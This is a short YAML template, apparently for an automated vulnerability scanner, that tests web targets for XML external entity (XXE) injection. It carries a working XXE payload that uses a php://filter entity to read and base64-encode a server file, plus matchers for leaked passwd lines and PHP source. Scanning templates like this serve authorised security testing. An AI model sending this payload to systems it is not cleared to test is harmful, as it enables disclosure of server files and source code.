id: xxe5-0141
name: 'XXE read in upload'
severity: critical
type: active
tags:
  - xxe
  - injection
  - xml
description: 'XXE entity via upload'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      upload:
        - '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index">]><r>&xxe;</r>'
    matchers:
      - type: word
        part: body
        words:
          - 'root:x:0:0'
          - 'root:'
          - 'XXE_OK'
          - 'localhost'
          - 'uid='
          - 'PD9waHA'
